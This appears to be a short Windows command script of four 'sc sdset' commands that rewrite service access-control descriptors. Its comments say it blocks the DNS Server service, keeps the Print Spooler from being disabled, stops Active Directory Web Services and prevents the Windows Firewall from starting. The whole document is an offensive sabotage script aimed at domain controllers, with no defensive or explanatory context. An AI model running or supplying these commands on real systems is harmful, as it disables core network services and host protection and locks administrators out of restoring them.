%Must be in CMD!

%Prevent starting up DNS Server Service
sc sdset dns D:(A;;CCLCSWWPDTLOCRRC;;;SY)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;SO)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

%Prevent Disabling Print-Spooler Service
sc sdset spooler D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPDTLOCRSDRCWDWO;;;WD)

%stop ADWS (Active Directory Web Services)
sc sdset ADWS D:(A;;CCLCSWWPDTLOCRRC;;;SY)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;SO)S:(AU;FA;CCDCLCSWWPDTLOCRSDRCWDWO;;;WD)

%Prevent starting the firewall
sc sdset MpsSvc D:(A;;CCLCSWWPDTLOCRRC;;;SY)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLC;;;S-1-5-80-2006800713-1441093265-249754844-3404434343-1444102779)S:(AU;FA;CCDCLCSWWPDTLOCRSDRCWDWO;;;WD)